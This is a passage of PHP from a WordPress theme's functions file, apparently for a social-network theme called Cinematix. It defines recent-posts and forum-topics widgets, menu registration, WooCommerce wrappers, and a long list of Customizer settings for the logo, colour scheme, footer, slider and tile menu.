array( 'description' => 'Widget displays recent blog posts with featured images.', )
);
}

// Creating widget front-end
// This is where the action happens
public function widget( $args, $instance ) {

$title = apply_filters( 'widget_title', $instance['title'] );

if ( isset( $instance[ 'number_of_blog_posts' ] ) ) {
$number_of_blog_posts = apply_filters( 'number_of_blog_posts', $instance['number_of_blog_posts'] );
}
else {
$number_of_blog_posts = '3';
}



// before and after widget arguments are defined by themes
echo $args['before_widget'];
if ( ! empty( $title ) )
echo $args['before_title'] . $title . $args['after_title'];

// This is where you run the code and display the output

$wp_query = '';
$paged = '';
$temp = $wp_query;
$wp_query= null;
$wp_query = new WP_Query();
$wp_query->query('posts_per_page=' . $number_of_blog_posts . ''.'&paged='.$paged);
while ($wp_query->have_posts()) : $wp_query->the_post();
?>

<div class="recent-post">
	<div class="recent-post-thumb"><a href="<?php the_permalink(); ?>"><?php the_post_thumbnail('small-thumbnail'); ?></a></div>
	<div class="recent-post-title"><a href="<?php the_permalink(); ?>"><?php the_title(); ?></a>
	<div class="recent-post-bottom"><div class="recent-post-time"><?php the_time('F j, Y') ?></div></div></div>
</div>

<?php endwhile; // end of loop

echo $args['after_widget'];

}

// Widget Backend
public function form( $instance ) {

if ( isset( $instance[ 'title' ] ) ) {
	$title = $instance[ 'title' ];
}
else {
	$title = 'Recent posts';
}

if ( isset( $instance[ 'number_of_blog_posts' ] ) ) {
	$number_of_blog_posts = $instance[ 'number_of_blog_posts' ];
}
else {
	$number_of_blog_posts = '3';
}

// Widget admin form
?>

<p>
<label for="<?php echo $this->get_field_id( 'title' ); ?>">Title:</label>
<input class="widefat" id="<?php echo $this->get_field_id( 'title' ); ?>" name="<?php echo $this->get_field_name( 'title' ); ?>" type="text" value="<?php echo esc_attr( $title ); ?>" />
</p>

<p>
<label for="<?php echo $this->get_field_id( 'number_of_blog_posts' ); ?>">Number of posts (1, 2, 3, 4 ...)</label>
<input class="widefat" id="<?php echo $this->get_field_id( 'number_of_blog_posts' ); ?>" name="<?php echo $this->get_field_name( 'number_of_blog_posts' ); ?>" type="text" value="<?php echo esc_attr( $number_of_blog_posts ); ?>" />
</p>
<?php
}



// Updating widget replacing old instances with new
public function update( $new_instance, $old_instance ) {
$instance = array();
$instance['title'] = ( ! empty( $new_instance['title'] ) ) ? strip_tags( $new_instance['title'] ) : '';
$instance['number_of_blog_posts'] = ( ! empty( $new_instance['number_of_blog_posts'] ) ) ? strip_tags( $new_instance['number_of_blog_posts'] ) : '';
return $instance;

}
} // Class DDRecentBlogPosts ends here

// Register and load the widget
function wp_load_DDRecentBlogPosts() {
	register_widget( 'DDRecentBlogPosts' );
}
add_action( 'widgets_init', 'wp_load_DDRecentBlogPosts' );
/////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////





/////////////////////////////////////////////////////////////////////////////////
// RECENT FORUMS TOPICS
/////////////////////////////////////////////////////////////////////////////////
class DDRecentTopics extends WP_Widget {

function __construct() {
parent::__construct(
// Base ID of your widget
'DDRecentTopics',
'Recent Forum Topics Widget',
array( 'description' => 'Widget displays recent forum topics.', )
);
}

// Creating widget front-end
// This is where the action happens
public function widget( $args, $instance ) {
$title = apply_filters( 'widget_title', $instance['title'] );
$number_of_topics = apply_filters( 'number_of_topics', $instance['number_of_topics'] );

// before and after widget arguments are defined by themes
echo $args['before_widget'];
if ( ! empty( $title ) )
echo $args['before_title'] . $title . $args['after_title'];

// This is where you run the code and display the output

	if ( bbp_has_topics( array( 'author' => 0, 'show_stickies' => false, 'order' => 'DESC', 'post_parent' => 'any', 'paged' => 1, 'posts_per_page' => $number_of_topics ) ) ) :
		bbp_get_template_part( 'loop', 'mytopics' );
	else :
		bbp_get_template_part( 'feedback', 'no-topics' );
	endif;

echo $args['after_widget'];

}

// Widget Backend
public function form( $instance ) {
if ( isset( $instance[ 'title' ] ) ) {
$title = $instance[ 'title' ];
$number_of_topics = $instance[ 'number_of_topics' ];
}
else {
$title = 'On the Forums';
$number_of_topics = '5';
}

// Widget admin form
?>
<p>
<label for="<?php echo $this->get_field_id( 'title' ); ?>">Title:</label>
<input class="widefat" id="<?php echo $this->get_field_id( 'title' ); ?>" name="<?php echo $this->get_field_name( 'title' ); ?>" type="text" value="<?php echo esc_attr( $title ); ?>" />
</p>

<p>
<label for="<?php echo $this->get_field_id( 'number_of_topics' ); ?>">Number of topics (1, 2, 3, 4 ...)</label>
<input class="widefat" id="<?php echo $this->get_field_id( 'number_of_topics' ); ?>" name="<?php echo $this->get_field_name( 'number_of_topics' ); ?>" type="text" value="<?php echo esc_attr( $number_of_topics ); ?>" />
</p>
<?php
}



// Updating widget replacing old instances with new
public function update( $new_instance, $old_instance ) {
$instance = array();
$instance['title'] = ( ! empty( $new_instance['title'] ) ) ? strip_tags( $new_instance['title'] ) : '';
$instance['number_of_topics'] = ( ! empty( $new_instance['number_of_topics'] ) ) ? strip_tags( $new_instance['number_of_topics'] ) : '';
return $instance;

}
} // Class DDRecentTopics ends here

// Register and load the widget
function wp_load_DDRecentTopics() {
	register_widget( 'DDRecentTopics' );
}
add_action( 'widgets_init', 'wp_load_DDRecentTopics' );
/////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////








add_action( 'init', 'register_menus' );
     function register_menus() {
           register_nav_menus(
                array(
                     'primary-menu' => esc_html__( 'Primary Menu',  'cinematix' )
                 )
            );

	register_nav_menus(
	    array(
	        'select-menu' => 'Mobile Menu',
	    )
	);
      }


function wp_nav_menu_select( $args = array() ) {

    $defaults = array(
        'theme_location' => '',
        'menu_class' => 'select-menu',
    );

    $args = wp_parse_args( $args, $defaults );

    if ( ( $menu_locations = get_nav_menu_locations() ) && isset( $menu_locations[ $args['theme_location'] ] ) ) {
        $menu = wp_get_nav_menu_object( $menu_locations[ $args['theme_location'] ] );

        $menu_items = wp_get_nav_menu_items( $menu->term_id );
        ?>
            <select name="menu-items" onchange="location = this.options[this.selectedIndex].value;" id="menu-<?php echo $args['theme_location'] ?>" class="<?php echo $args['menu_class'] ?>">
                <option value=""><?php esc_html_e( 'Menu', 'cinematix' ) ?></option>
                <?php foreach( (array) $menu_items as $key => $menu_item ) : ?>
                    <option value="<?php echo $menu_item->url ?>"><?php echo $menu_item->title ?></option>
                <?php endforeach; ?>
            </select>
        <?php
    }

    else {
        ?>
            <select class="menu-not-found">
                <option value=""><?php esc_html_e( 'Menu Not Found', 'cinematix' ) ?></option>
            </select>
        <?php
    }

}




function DD_avatar_size(){
	   define( 'BP_AVATAR_THUMB_WIDTH', 50 );
	   define( 'BP_AVATAR_THUMB_HEIGHT', 50 );
	   define( 'BP_AVATAR_FULL_WIDTH', '150');
	   define( 'BP_AVATAR_FULL_HEIGHT', '150' );
}
add_action('bp_init', 'DD_avatar_size', 2);



function bp_excerpt_group_description( $description ) {
$length = 115;
$description = substr($description,0,$length);
return strip_tags($description);
}
add_filter( 'bp_get_group_description_excerpt', 'bp_excerpt_group_description');


function DD_login_enqueue_style() {
	wp_enqueue_style( 'WP-Login', get_template_directory_uri() . '/css/wp-login.css', false );
	wp_enqueue_style( 'WP-Login-Color-Scheme', get_template_directory_uri() . '/css/wp-login-color-scheme-' . get_theme_mod( 'DD_color_scheme', '0' ) . '.css', false );
}
add_action( 'login_enqueue_scripts', 'DD_login_enqueue_style', 10 );

// WOOCOMMERCE
remove_action( 'woocommerce_before_main_content', 'woocommerce_output_content_wrapper', 10);
remove_action( 'woocommerce_after_main_content', 'woocommerce_output_content_wrapper_end', 10);
add_action('woocommerce_before_main_content', create_function('', 'echo "<div id=\"content\">";'), 10);
add_action('woocommerce_after_main_content', create_function('', 'echo "</div>";'), 10);
remove_action( 'woocommerce_before_main_content',
    'woocommerce_breadcrumb', 20, 0);

add_theme_support( 'woocommerce' );






function DD_the_post_thumbnail_caption() {
  global $post;

  $thumbnail_id = get_post_thumbnail_id($post->ID);
  $thumbnail_image = get_posts(array('p' => $thumbnail_id, 'post_type' => 'attachment'));

  if ($thumbnail_image && isset($thumbnail_image[0])) {
    echo '<span>'.$thumbnail_image[0]->post_excerpt.'</span>';
  }
}


function rtmedia_main_template_include($template, $new_rt_template){
global $wp_query;
$wp_query->is_page = true;
return locate_template('rtmedia.php');
}
add_filter('rtmedia_main_template_include', 'rtmedia_main_template_include', 20, 2);



function bbp_enable_visual_editor( $args = array() ) {
    $args['tinymce'] = true;
    return $args;
}
add_filter( 'bbp_after_get_the_content_parse_args', 'bbp_enable_visual_editor' );



////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////CUSTOMIZER///////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////

add_action( 'customize_register' , 'DD_theme_options' );
function DD_theme_options( $wp_customize ) {


///////////////////////////////////////////////////////////////////////////////////////////////////

$wp_customize->add_section( 'DD_logo_section' , array(
    'title'       => 'Logo',
    'priority'    => 30,
    'description' => 'Upload your logo. Recommended size of logo is 160px x 45px.',
) );

$wp_customize->add_setting( 'DD_logo' , array(
    'sanitize_callback' => 'esc_url_raw',
) );

$wp_customize->add_control( new WP_Customize_Image_Control( $wp_customize, 'DD_logo', array(
    'label'    => 'Logo',
    'section'  => 'DD_logo_section',
    'settings' => 'DD_logo',
) ) );


$wp_customize->add_setting( 'DD_logo_topspace' , array(
    'default' => '20px',
    'sanitize_callback' => 'esc_attr',
) );

$wp_customize->add_control( 'DD_logo_topspace', array(
    'type'     => 'text',
    'priority' => 10,
    'section'  => 'DD_logo_section',
    'settings' => 'DD_logo_topspace',
    'label'    => 'Top spacing of logo',
) );

//////////////////////////////////////////////////////////////////////////////////////////////////////

$wp_customize->add_section( 'DD_registration_section' , array(
    'title'       => 'Registration',
    'priority'    => 31,
) );

$wp_customize->add_setting( 'DD_registration_disable' , array(
    'sanitize_callback' => 'esc_url_raw',
) );

$wp_customize->add_control( 'DD_registration_disable', array(
    'type'     => 'checkbox',
    'priority' => 1,
    'section'  => 'DD_registration_section',
    'settings'  => 'DD_registration_disable',
    'label'    => 'Disable `Complete Sign Up` button.',
) );


$wp_customize->add_setting( 'DD_registration_disable_title' , array(
    'default' => 'Registration Disabled',
    'sanitize_callback' => 'esc_attr',
) );

$wp_customize->add_control( 'DD_registration_disable_title', array(
    'type'     => 'text',
    'priority' => 2,
    'section'  => 'DD_registration_section',
    'settings'  => 'DD_registration_disable_title',
    'label'    => 'Change `Registration Disabled` button',
) );

//////////////////////////////////////////////////////////////////

$wp_customize->add_section( 'DD_color_scheme_section' , array(
    'title'       => 'Color scheme',
    'priority'    => 31,
) );

$wp_customize->add_setting( 'DD_color_scheme' , array(
    'sanitize_callback' => 'esc_attr',
) );

$wp_customize->add_control( 'DD_color_scheme',
array(
		'label'    => 'Change color scheme.',
		'section'  => 'DD_color_scheme_section',
	    'settings'  => 'DD_color_scheme',
		'type'     => 'radio',
		'choices'  => array(
			'0'  => 'None',
			'1' => 'Grape',
			'2' => 'Blue',
			'3' => 'Pink',
			'4' => 'Pumpkin Orange',
			'5' => 'Golden Brown',
			'6' => 'Green',
			'7' => 'Hazel Green',
			'8' => 'Teal',
			'9' => 'Red Wine',
			'10' => 'White',
		),
) );
//////////////////////////////////////////////////////////////////

$wp_customize->add_section( 'DD_footer' , array(
    'title'       => 'Footer',
    'priority'    => 31,
) );

$wp_customize->add_setting( 'DD_footer_icon' , array(
    'sanitize_callback' => 'esc_url_raw',
) );

$wp_customize->add_control( new WP_Customize_Image_Control( $wp_customize, 'DD_footer_icon', array(
    'label'    => 'Footer icon of Facebook',
    'priority' => 1,
    'section'  => 'DD_footer',
    'settings' => 'DD_footer_icon',
) ) );

$wp_customize->add_setting( 'DD_footer_link' , array(
    'default' => 'http://www.facebook.com',
    'sanitize_callback' => 'esc_url_raw',
) );

$wp_customize->add_control( 'DD_footer_link', array(
    'type'     => 'text',
    'priority' => 1,
    'section'  => 'DD_footer',
    'settings'  => 'DD_footer_link',
    'label'    => 'Replace link to Facebook.',
) );


$wp_customize->add_setting( 'DD_copyright' , array(
    'default' => 'All rights reserved by Cinematix',
    'sanitize_callback' => 'esc_attr',
) );

$wp_customize->add_control( 'DD_copyright', array(
    'type'     => 'text',
    'priority' => 2,
    'section'  => 'DD_footer',
    'settings' => 'DD_copyright',
    'label'    => 'Change `All rights reserved by Cinematix`.',
) );


//////////////////////////////////////////////////////////////////

$wp_customize->add_section( 'DD_slider_section' , array(
    'title'       => 'Slider',
    'priority'    => 30,
    'description' => 'Customize frontpage slider.',
) );

$wp_customize->add_setting( 'DD_1st_slide_row1' , array(
    'default' => 'Cinematix',
    'sanitize_callback' => 'esc_attr',
) );

$wp_customize->add_control( 'DD_1st_slide_row1', array(
    'type'     => 'text',
    'priority' => 1,
    'section'  => 'DD_slider_section',
    'settings'  => 'DD_1st_slide_row1',
    'label'    => '1st Slide, 1st Row',
) );


$wp_customize->add_setting( 'DD_1st_slide_row2' , array(
    'default' => 'A Social Network Service',
    'sanitize_callback' => 'esc_attr',
) );

$wp_customize->add_control( 'DD_1st_slide_row2', array(
    'type'     => 'text',
    'priority' => 1,
    'section'  => 'DD_slider_section',
    'settings'  => 'DD_1st_slide_row2',
    'label'    => '1st Slide, 2nd Row',
) );


$wp_customize->add_setting( 'DD_1st_slide_row3' , array(
    'default' => 'Register on our site and start creating profiles, posting messages, making connections, creating and interacting in groups and much more.',
    'sanitize_callback' => 'esc_attr',
) );

$wp_customize->add_control( 'DD_1st_slide_row3', array(
    'type'     => 'textarea',
    'priority' => 1,
    'section'  => 'DD_slider_section',
    'settings'  => 'DD_1st_slide_row3',
    'label'    => '1st Slide, 3rd Row',
) );


$wp_customize->add_setting( 'DD_1st_slide_link1' , array(
    'default' => 'register',
    'sanitize_callback' => 'esc_attr',
) );

$wp_customize->add_control( 'DD_1st_slide_link1', array(
    'type'     => 'text',
    'priority' => 1,
    'section'  => 'DD_slider_section',
    'settings'  => 'DD_1st_slide_link1',
    'label'    => '1st Slide, link for non-logged users',
) );


$wp_customize->add_setting( 'DD_1st_slide_link2' , array(
    'default' => 'about-us',
    'sanitize_callback' => 'esc_attr',
) );

$wp_customize->add_control( 'DD_1st_slide_link2', array(
    'type'     => 'text',
    'priority' => 1,
    'section'  => 'DD_slider_section',
    'settings'  => 'DD_1st_slide_link2',
    'label'    => '1st Slide, link for logged users',
) );


$wp_customize->add_setting( 'DD_1st_slide_icon' , array(
    'sanitize_callback' => 'esc_url_raw',
) );

$wp_customize->add_control( new WP_Customize_Image_Control( $wp_customize, 'DD_1st_slide_icon', array(
    'label'    => '1st Slide, icon',
    'priority' => 1,
    'section'  => 'DD_slider_section',
    'settings' => 'DD_1st_slide_icon',
) ) );


$wp_customize->add_setting( 'DD_2nd_slide_1' , array(
    'default' => 'A social networking service',
    'sanitize_callback' => 'esc_attr',
) );

$wp_customize->add_control( 'DD_2nd_slide_1', array(
    'type'     => 'text',
    'priority' => 2,
    'section'  => 'DD_slider_section',
    'settings'  => 'DD_2nd_slide_1',
    'label'    => '2nd Slide',
) );


$wp_customize->add_setting( 'DD_2nd_slide_2' , array(
    'default' => 'How does it work?',
    'sanitize_callback' => 'esc_attr',
) );

$wp_customize->add_control( 'DD_2nd_slide_2', array(
    'type'     => 'text',
    'priority' => 2,
    'section'  => 'DD_slider_section',
    'settings'  => 'DD_2nd_slide_2',
    'label'    => '2nd Slide',
) );


$wp_customize->add_setting( 'DD_2nd_slide_3' , array(
    'default' => 'Users must register before using the site, after which they may create a personal profile, add other users as friends, and exchange messages, including automatic notifications when they update their profile. Additionally, users may join common-interest user groups, organized by workplace, school or college, or other characteristics.',
    'sanitize_callback' => 'esc_attr',
) );

$wp_customize->add_control( 'DD_2nd_slide_3', array(
    'type'     => 'text',
    'priority' => 2,
    'section'  => 'DD_slider_section',
    'settings'  => 'DD_2nd_slide_3',
    'label'    => '2nd Slide',
) );

$wp_customize->add_setting( 'DD_3rd_slide' , array(
    'sanitize_callback' => 'esc_url_raw',
) );

$wp_customize->add_control( new WP_Customize_Image_Control( $wp_customize, 'DD_3rd_slide', array(
    'label'    => '3rd Slide',
    'section'  => 'DD_slider_section',
    'settings' => 'DD_3rd_slide',
) ) );


$wp_customize->add_setting( 'DD_3rd_slide_alt' , array(
    'default' => 'Take a tour',
    'sanitize_callback' => 'esc_attr',
) );

$wp_customize->add_control( 'DD_3rd_slide_alt', array(
    'type'     => 'text',
    'priority' => 3,
    'section'  => 'DD_slider_section',
    'settings'  => 'DD_3rd_slide_alt',
    'label'    => '3rd Slide, alternative text',
) );


$wp_customize->add_setting( 'DD_3rd_slide_link' , array(
    'default' => 'about-us',
    'sanitize_callback' => 'esc_attr',
) );

$wp_customize->add_control( 'DD_3rd_alt', array(
    'type'     => 'text',
    'priority' => 3,
    'section'  => 'DD_slider_section',
    'settings'  => 'DD_3rd_slide_link',
    'label'    => '3rd Slide, link',
) );
////////////////////////////////////////////////////////////////////////////////////////////////////

$wp_customize->add_section( 'DD_menu_section' , array(
    'title'       => 'Menu',
    'priority'    => 30,
    'description' => 'Customize tile menu',
) );


$wp_customize->add_setting( 'DD_menu_title_1' , array(
    'default' => 'ACTIVITY',
    'sanitize_callback' => 'esc_attr',
) );

$wp_customize->add_control( 'DD_menu_title_1', array(
    'type'     => 'text',
    'priority' => 1,
    'section'  => 'DD_menu_section',
    'settings'  => 'DD_menu_title_1',
    'label'    => '`ACTIVITY` title',
) );


$wp_customize->add_setting( 'DD_menu_link_1' , array(
    'default' => 'activity',
    'sanitize_callback' => 'esc_attr',
) );

$wp_customize->add_control( 'DD_menu_link_1', array(
    'type'     => 'text',
    'priority' => 1,
    'section'  => 'DD_menu_section',
    'settings'  => 'DD_menu_link_1',
    'label'    => '`ACTIVITY` link',
) );

$wp_customize->add_setting( 'DD_menu_icon_1' , array(
    'sanitize_callback' => 'esc_url_raw',
) );

$wp_customize->add_control( new WP_Customize_Image_Control( $wp_customize, 'DD_menu_icon_1', array(
    'label'    => 'Activity Icon (.png)',
    'priority' => 1,
    'section'  => 'DD_menu_section',
    'settings'  => 'DD_menu_icon_1',
) ) );



$wp_customize->add_setting( 'DD_menu_title_2' , array(
    'default' => 'BLOG',
    'sanitize_callback' => 'esc_attr',
) );

$wp_customize->add_control( 'DD_menu_title_2', array(
    'type'     => 'text',
    'priority' => 2,
    'section'  => 'DD_menu_section',
    'settings'  => 'DD_menu_title_2',
    'label'    => '`BLOG` title',
) );


$wp_customize->add_setting( 'DD_menu_link_2' , array(
    'default' => 'blog',
    'sanitize_callback' => 'esc_attr',
) );

$wp_customize->add_control( 'DD_menu_link_2', array(
    'type'     => 'text',
    'priority' => 2,
    'section'  => 'DD_menu_section',
    'settings'  => 'DD_menu_link_2',
    'label'    => '`BLOG` link',
) );

$wp_customize->add_setting( 'DD_menu_icon_2' , array(
    'sanitize_callback' => 'esc_url_raw',
) );

$wp_customize->add_control( new WP_Customize_Image_Control( $wp_customize, 'DD_menu_icon_2', array(
    'label'    => '`BLOG` Icon (.png)',
    'priority' => 2,
    'section'  => 'DD_menu_section',
    'settings'  => 'DD_menu_icon_2',
) ) );



$wp_customize->add_setting( 'DD_menu_title_3' , array(
    'default' => 'FORUMS',
    'sanitize_callback' => 'esc_attr',
) );

$wp_customize->add_control( 'DD_menu_title_3', array(
    'type'     => 'text',
    'priority' => 3,
    'section'  => 'DD_menu_section',
    'settings'  => 'DD_menu_title_3',
    'label'    => '`FORUMS` title',
) );


$wp_customize->add_setting( 'DD_menu_link_3' , array(
    'default' => 'forums',
    'sanitize_callback' => 'esc_attr',
) );

$wp_customize->add_control( 'DD_menu_link_3', array(
    'type'     => 'text',
    'priority' => 3,
    'section'  => 'DD_menu_section',
    'settings'  => 'DD_menu_link_3',
    'label'    => '`FORUMS` link',
) );

$wp_customize->add_setting( 'DD_menu_icon_3' , array(
    'sanitize_callback' => 'esc_url_raw',
) );

$wp_customize->add_control( new WP_Customize_Image_Control( $wp_customize, 'DD_menu_icon_3', array(
    'label'    => '`FORUMS` Icon (.png)',
    'priority' => 3,
    'section'  => 'DD_menu_section',
    'settings'  => 'DD_menu_icon_3',
) ) );


$wp_customize->add_setting( 'DD_menu_title_4' , array(
    'default' => 'GROUPS',
    'sanitize_callback' => 'esc_attr',
) );

$wp_customize->add_control( 'DD_menu_title_4', array(
    'type'     => 'text',
    'priority' => 4,
    'section'  => 'DD_menu_section',
    'settings'  => 'DD_menu_title_4',
    'label'    => '`GROUPS` title',
) );


$wp_customize->add_setting( 'DD_menu_link_4' , array(
    'default' => 'groups',
    'sanitize_callback' => 'esc_attr',
) );

$wp_customize->add_control( 'DD_menu_link_4', array(
    'type'     => 'text',
    'priority' => 4,
    'section'  => 'DD_menu_section',
    'settings'  => 'DD_menu_link_4',
    'label'    => '`GROUPS` link',
) );

$wp_customize->add_setting( 'DD_menu_icon_4' , array(
    'sanitize_callback' => 'esc_url_raw',
) );

$wp_customize->add_control( new WP_Customize_Image_Control( $wp_customize, 'DD_menu_icon_4', array(
    'label'    => '`GROUPS` Icon (.png)',
    'priority' => 4,
    'section'  => 'DD_menu_section',
    'settings'  => 'DD_menu_icon_4',
) ) );



$wp_customize->add_setting( 'DD_menu_title_5' , array(
    'default' => 'MEMBERS',
    'sanitize_callback' => 'esc_attr',
) );

$wp_customize->add_control( 'DD_menu_title_5', array(
    'type'     => 'text',
    'priority' => 5,
    'section'  => 'DD_menu_section',
    'settings'  => 'DD_menu_title_5',
    'label'    => '`MEMBERS` title',
) );


$wp_customize->add_setting( 'DD_menu_link_5' , array(
    'default' => 'members',
    'sanitize_callback' => 'esc_attr',
) );

$wp_customize->add_control( 'DD_menu_link_5', array(
    'type'     => 'text',
    'priority' => 5,
    'section'  => 'DD_menu_section',
    'settings'  => 'DD_menu_link_5',
    'label'    => '`MEMBERS` link',
) );

$wp_customize->add_setting( 'DD_menu_icon_5' , array(
    'sanitize_callback' => 'esc_url_raw',
) );

$wp_customize->add_control( new WP_Customize_Image_Control( $wp_customize, 'DD_menu_icon_5', array(
    'label'    => '`MEMBERS` Icon (.png)',
    'priority' => 5,
    'section'  => 'DD_menu_section',
    'settings'  => 'DD_menu_icon_5',
) ) );


$wp_customize->add_setting( 'DD_menu_title_6' , array(
    'default' => 'CONTACT',
    'sanitize_callback' => 'esc_attr',
) );

$wp_customize->add_control( 'DD_menu_title_6', array(
    'type'     => 'text',
    'priority' => 6,
    'section'  => 'DD_menu_section',
    'settings'  => 'DD_menu_title_6',
    'label'    => '`CONTACT` title',
) );


$wp_customize->add_setting( 'DD_menu_link_6' , array(
    'default' => 'contact',
    'sanitize_callback' => 'esc_attr',
) );

$wp_customize->add_control( 'DD_menu_link_6', array(
    'type'     => 'text',
    'priority' => 6,
    'section'  => 'DD_menu_section',
    'settings'  => 'DD_menu_link_6',
    'label'    => '`CONTACT` link',
) );

$wp_customize->add_setting( 'DD_menu_icon_6' , array(
    'sanitize_callback' => 'esc_url_raw',
) );

$wp_customize->add_control( new WP_Customize_Image_Control( $wp_customize, 'DD_menu_icon_6', array(
    'label'    => '`CONTACT` Icon (.png)',
    'priority' => 6,
    'section'  => 'DD_menu_section',
    'settings'  => 'DD_menu_icon_6',
) ) );



}


?>